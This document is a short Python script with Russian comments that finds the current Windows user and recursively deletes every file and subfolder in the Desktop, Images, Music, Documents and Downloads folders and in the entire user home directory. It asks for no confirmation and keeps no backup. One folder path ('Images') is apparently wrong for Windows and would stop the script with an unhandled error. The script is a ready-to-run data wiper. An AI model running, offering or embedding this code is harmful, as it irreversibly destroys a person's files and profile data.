import os
import shutil

# Получаем имя текущего пользователя
user = os.getlogin()

# Папки, из которых нужно удалять файлы
folders = [
    f'C:\\Users\\{user}\\Desktop',
    f'C:\\Users\\{user}\\Images',
    f'C:\\Users\\{user}\\Music',
    f'C:\\Users\\{user}\\Documents',
    f'C:\\Users\\{user}\\Downloads',
    f'C:\\Users\\{user}',
]

# Функция удаления файлов в папках
def clean_folders(folders):
    for folder in folders:
        for filename in os.listdir(folder):
            file_path = os.path.join(folder, filename)
            try:
                if os.path.isfile(file_path) or os.path.islink(file_path):
                    os.remove(file_path)  # Удалить файл
                elif os.path.isdir(file_path):
                    shutil.rmtree(file_path)  # Удалить папку и её содержимое
            except Exception as e:
                print(f'Ошибка при удалении {file_path}: {e}')

if __name__ == '__main__':
    clean_folders(folders)
